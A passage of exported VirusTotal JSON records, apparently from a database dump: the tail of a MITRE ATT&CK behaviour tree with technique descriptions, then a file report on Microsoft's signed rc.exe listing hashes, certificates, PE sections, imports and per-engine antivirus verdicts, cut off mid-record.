                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "parse PE header"
                  },
                  {
                    "severity": "INFO",
                    "description": "link function at runtime on Windows"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "query environment variable"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "enumerate files on windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "enumerate files on Windows"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/da252b823e15e067ae154173f481639934ecbd086369e851cf203170d65836e8/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fa7448448ff030e48689"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T18C635B99776400BAD463827DC9E1DB55E672F80A077903CF52A8C35A2F637E09A3E731",
      "vhash": "0640566d1515151az44!z",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "creation_date": 1247530448,
      "names": [
        "rc.exe",
        "RC.Exe",
        "515433.tmpscan",
        "sbs_ve_ambr_20160008220426.771_    389297",
        "sbs_ve_ambr_20150608034709.515_    392410",
        "sbs_ve_ambr_20160231053826.072_    112705",
        "WinSDK_RC_Exe_DA3564A6_1474_456E_A9AC_D641E53A84D4_amd64",
        "sbs_ve_ambr_20151017001811.064_   1300813",
        "c1a698.tmpscan",
        "t205136t111328.tmp",
        "8edfde.rbf",
        "winsdk_rc_exe_da3564a6_1474_456e_a9ac_d641e53a84d4_amd64",
        "sbs_ve_ambr_20150714002335.472_   1383159",
        "sbs_ve_ambr_20151104004246.051_   1434820",
        "9b14612f07947181c390a474328da12e.exes",
        "sbs_ve_ambr_20151017214127.535_    404041",
        "sbs_ve_ambr_20150901002722.470_   1220457"
      ],
      "signature_info": {
        "product": "Microsoft® Windows® Operating System",
        "verified": "Signed",
        "description": "Microsoft Resource Compiler",
        "file version": "6.1.7600.16385 (win7_rtm.090713-1255)",
        "signing date": "05:39 AM 05/14/2010",
        "x509": [
          {
            "valid usage": "Code Signing",
            "name": "Microsoft Code Signing PCA",
            "algorithm": "1.3.14.3.2.29",
            "valid from": "2007-08-22 22:31:02",
            "valid to": "2012-08-25 07:00:00",
            "serial number": "2E AB 11 DC 50 FF 5C 9D CB C0",
            "cert issuer": "Microsoft Root Authority",
            "thumbprint": "3036E3B25B88A55B86FC90E6E9EAAD5081445166"
          },
          {
            "valid usage": "Code Signing",
            "name": "Microsoft Corporation",
            "algorithm": "sha1RSA",
            "valid from": "2009-12-07 22:40:29",
            "valid to": "2011-03-07 22:40:29",
            "serial number": "61 01 CF 3E 00 00 00 00 00 0F",
            "cert issuer": "Microsoft Code Signing PCA",
            "thumbprint": "9617094A1CFB59AE7C1F7DFDB6739E4E7C40508F"
          },
          {
            "valid usage": "Timestamp Signing",
            "name": "Microsoft Timestamping PCA",
            "algorithm": "sha1RSA",
            "valid from": "2006-09-16 01:04:47",
            "valid to": "2019-09-15 07:00:00",
            "serial number": "6A 0B 99 4F C0 00 25 AB 11 DB 45 1F 58 7A 67 A2",
            "cert issuer": "Microsoft Root Authority",
            "thumbprint": "3EA99A60058275E0ED83B892A909449F8C33B245"
          },
          {
            "valid usage": "Timestamp Signing",
            "name": "Microsoft Time-Stamp Service",
            "algorithm": "sha1RSA",
            "valid from": "2008-07-25 19:02:17",
            "valid to": "2013-07-25 19:12:17",
            "serial number": "61 06 94 2D 00 00 00 00 00 09",
            "cert issuer": "Microsoft Timestamping PCA",
            "thumbprint": "05FECB745F7F3B1A0E262A73435CCB7EAAED8B37"
          }
        ],
        "original name": "rc.exe",
        "signers": "Microsoft Corporation; Microsoft Code Signing PCA; Microsoft Root Authority",
        "counter signers details": [
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Timestamp Signing",
            "name": "Microsoft Time-Stamp Service",
            "algorithm": "sha1RSA",
            "valid from": "07:02 PM 07/25/2008",
            "valid to": "07:12 PM 07/25/2013",
            "serial number": "61 06 94 2D 00 00 00 00 00 09",
            "cert issuer": "Microsoft Timestamping PCA",
            "thumbprint": "05FECB745F7F3B1A0E262A73435CCB7EAAED8B37"
          },
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Timestamp Signing",
            "name": "Microsoft Timestamping PCA",
            "algorithm": "sha1RSA",
            "valid from": "01:04 AM 09/16/2006",
            "valid to": "07:00 AM 09/15/2019",
            "serial number": "6A 0B 99 4F C0 00 25 AB 11 DB 45 1F 58 7A 67 A2",
            "cert issuer": "Microsoft Root Authority",
            "thumbprint": "3EA99A60058275E0ED83B892A909449F8C33B245"
          },
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "All",
            "name": "Microsoft Root Authority",
            "algorithm": "md5RSA",
            "valid from": "07:00 AM 01/10/1997",
            "valid to": "07:00 AM 12/31/2020",
            "serial number": "00 C1 00 8B 3C 3C 88 11 D1 3E F6 63 EC DF 40",
            "cert issuer": "Microsoft Root Authority",
            "thumbprint": "A43489159A520F0D93D032CCAF37E7FE20A8B419"
          }
        ],
        "counter signers": "Microsoft Time-Stamp Service; Microsoft Timestamping PCA; Microsoft Root Authority",
        "copyright": "© Microsoft Corporation. All rights reserved.",
        "signers details": [
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Code Signing",
            "name": "Microsoft Corporation",
            "algorithm": "sha1RSA",
            "valid from": "10:40 PM 12/07/2009",
            "valid to": "10:40 PM 03/07/2011",
            "serial number": "61 01 CF 3E 00 00 00 00 00 0F",
            "cert issuer": "Microsoft Code Signing PCA",
            "thumbprint": "9617094A1CFB59AE7C1F7DFDB6739E4E7C40508F"
          },
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Code Signing",
            "name": "Microsoft Code Signing PCA",
            "algorithm": "sha1RSA",
            "valid from": "10:31 PM 08/22/2007",
            "valid to": "07:00 AM 08/25/2012",
            "serial number": "2E AB 11 DC 50 FF 5C 9D CB C0",
            "cert issuer": "Microsoft Root Authority",
            "thumbprint": "3036E3B25B88A55B86FC90E6E9EAAD5081445166"
          },
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "All",
            "name": "Microsoft Root Authority",
            "algorithm": "md5RSA",
            "valid from": "07:00 AM 01/10/1997",
            "valid to": "07:00 AM 12/31/2020",
            "serial number": "00 C1 00 8B 3C 3C 88 11 D1 3E F6 63 EC DF 40",
            "cert issuer": "Microsoft Root Authority",
            "thumbprint": "A43489159A520F0D93D032CCAF37E7FE20A8B419"
          }
        ],
        "internal name": "rc.exe"
      },
      "last_modification_date": 1706124690,
      "type_tag": "peexe",
      "times_submitted": 8,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 66880,
      "type_extension": "exe",
      "authentihash": "512bbf135eec8ce43bd36748223e948a2175a5dd36c7d3c02aa060cd259b3202",
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "info": "LTCG/C++",
            "version": "15.00.30729",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "9.00.30729",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2008",
            "type": "Tool",
            "name": "Visual Studio"
          },
          {
            "info": "PKCS #7",
            "version": "2.0",
            "type": "Sign tool",
            "name": "Windows Authenticode"
          }
        ]
      },
      "last_submission_date": 1702105093,
      "known_distributors": {
        "filenames": [
          "WinSDK_RC_Exe_DA3564A6_1474_456E_A9AC_D641E53A84D4_amd64"
        ],
        "products": [
          "Visual Studio Professional 2013"
        ],
        "distributors": [
          "Microsoft"
        ],
        "data_sources": [
          "National Software Reference Library (NSRL)"
        ]
      },
      "meaningful_name": "rc.exe",
      "trid": [
        {
          "file_type": "Windows Control Panel Item (generic)",
          "probability": 70.8
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 12.9
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 6.2
        },
        {
          "file_type": "Windows Icons Library (generic)",
          "probability": 2.5
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 2.4
        }
      ],
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "harmless",
          "confidence": 100,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "CLEAN"
          ]
        }
      },
      "sha256": "c9c063a934f85d3a72709f2ca824dc6b7155268ad4f73da3493908cb4d1a3138",
      "tags": [
        "peexe",
        "assembly",
        "overlay",
        "signed",
        "detect-debug-environment",
        "idle",
        "64bits",
        "known-distributor"
      ],
      "last_analysis_date": 1706117450,
      "unique_sources": 5,
      "first_submission_date": 1346158319,
      "sha1": "9126b8320d18a52b1315d5ada08e1c380d18806b",
      "ssdeep": "1536:liccFLeZVkZ1+AFuaTPmDD7Ml7OcCK8c7g295f:liYZauAuDD7MgcCK8Sg295f",
      "md5": "9b14612f07947181c390a474328da12e",
      "pe_info": {
        "resource_details": [
          {
            "lang": "ENGLISH US",
            "entropy": 3.5406911373138428,
            "chi2": 68597.61,
            "filetype": "unknown",
            "sha256": "bdaeedea92ed268309175bcf96e9d015e035dadb8db52e0b3f491a1a9c9bf112",
            "type": "RT_VERSION"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 4.9933366775512695,
            "chi2": 4306.3,
            "filetype": "XML",
            "sha256": "4c883c255e5298beae82503645dac4a978a99985a7c77e2213d9a2999d753a88",
            "type": "RT_MANIFEST"
          }
        ],
        "rich_pe_header_hash": "6457057673d649b3a37fc258391a23f6",
        "imphash": "3f6d921a7ee05c7d07bdfb59c4978743",
        "overlay": {
          "entropy": 7.38527774810791,
          "offset": 60928,
          "chi2": 8661.06,
          "filetype": "unknown",
          "md5": "c619c87a95a9b6086fbd6074ce0b9c2b",
          "size": 5952
        },
        "compiler_product_versions": [
          "[ASM] VS2008 SP1 build 30729 count=7",
          "[C++] VS2008 SP1 build 30729 count=33",
          "[IMP] VS2008 SP1 build 30729 count=5",
          "[---] Unmarked objects count=87",
          "[ C ] VS2008 SP1 build 30729 count=92",
          "[RES] VS2008 SP1 [9.0] build 30729 count=1",
          "[LNK] VS2008 SP1 build 30729 count=1",
          "id: 0x8a, version: 30729 count=2"
        ],
        "resource_langs": {
          "ENGLISH US": 2
        },
        "machine_type": 34404,
        "timestamp": 1247530448,
        "resource_types": {
          "RT_MANIFEST": 1,
          "RT_VERSION": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 506747.25,
            "virtual_address": 4096,
            "flags": "rx",
            "raw_size": 49152,
            "entropy": 6.28,
            "virtual_size": 49036,
            "md5": "93ae0e989b4b0e5ada7dc499c5e873d2"
          },
          {
            "name": ".data",
            "chi2": 1061360.75,
            "virtual_address": 53248,
            "flags": "rw",
            "raw_size": 6144,
            "entropy": 1.74,
            "virtual_size": 14512,
            "md5": "050e478cbeb23a391fbf6563b42ce6a7"
          },
          {
            "name": ".pdata",
            "chi2": 141338.75,
            "virtual_address": 69632,
            "flags": "r",
            "raw_size": 2048,
            "entropy": 4.38,
            "virtual_size": 1968,
            "md5": "2c9ce822cd7531a791903754466f9299"
          },
          {
            "name": ".rsrc",
            "chi2": 74808.8,
            "virtual_address": 73728,
            "flags": "r",
            "raw_size": 1536,
            "entropy": 4.2,
            "virtual_size": 1504,
            "md5": "316b55c7c60c329b599e6a7b548a486b"
          },
          {
            "name": ".reloc",
            "chi2": 115454.5,
            "virtual_address": 77824,
            "flags": "r",
            "raw_size": 1024,
            "entropy": 2.55,
            "virtual_size": 750,
            "md5": "b18d0f6681e3abd9ae4ea53917875ca0"
          }
        ],
        "import_list": [
          {
            "library_name": "RCDLL.dll",
            "imported_functions": [
              "Handler",
              "RCW"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "CloseHandle",
              "CreateFileW",
              "DecodePointer",
              "DeleteCriticalSection",
              "EncodePointer",
              "EnterCriticalSection",
              "ExitProcess",
              "FlsAlloc",
              "FlsFree",
              "FlsGetValue",
              "FlsSetValue",
              "FlushFileBuffers",
              "FreeEnvironmentStringsW",
              "GetACP",
              "GetCommandLineW",
              "GetConsoleCP",
              "GetConsoleMode",
              "GetCPInfo",
              "GetCurrentProcess",
              "GetCurrentProcessId",
              "GetCurrentThreadId",
              "GetEnvironmentStringsW",
              "GetFileType",
              "GetLastError",
              "GetModuleFileNameA",
              "GetModuleFileNameW",
              "GetModuleHandleW",
              "GetOEMCP",
              "GetProcAddress",
              "GetStartupInfoW",
              "GetStdHandle",
              "GetStringTypeW",
              "GetSystemInfo",
              "GetSystemTimeAsFileTime",
              "GetTickCount",
              "GetVersionExW",
              "HeapAlloc",
              "HeapCreate",
              "HeapFree",
              "HeapSetInformation",
              "InitializeCriticalSectionAndSpinCount",
              "LCMapStringW",
              "LeaveCriticalSection",
              "LoadLibraryExW",
              "MultiByteToWideChar",
              "OutputDebugStringA",
              "QueryPerformanceCounter",
              "RtlCaptureContext",
              "RtlLookupFunctionEntry",
              "RtlUnwindEx",
              "RtlVirtualUnwind",
              "SetConsoleCtrlHandler",
              "SetErrorMode",
              "SetFilePointer",
              "SetHandleCount",
              "SetLastError",
              "SetStdHandle",
              "SetThreadStackGuarantee",
              "SetUnhandledExceptionFilter",
              "Sleep",
              "TerminateProcess",
              "UnhandledExceptionFilter",
              "VirtualAlloc",
              "VirtualProtect",
              "VirtualQuery",
              "WideCharToMultiByte",
              "WriteConsoleW",
              "WriteFile"
            ]
          }
        ],
        "entry_point": 13376
      },
      "magic": "PE32+ executable (console) x86-64, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 1,
        "undetected": 69
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240106"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240123"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.138.50843",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Alibaba": {
          "category": "undetected",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.138.50843",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Cybereason": {
          "category": "undetected",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.625",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Elastic": {
          "category": "undetected",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "28622",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "APEX": {
          "category": "undetected",
          "engine_name": "APEX",
          "engine_version": "6.492",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240122"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5039",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.37226B:27.34679",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Google": {
          "category": "undetected",
          "engine_name": "Google",
          "engine_version": "1706113842",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.155.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36375",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240124-14",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
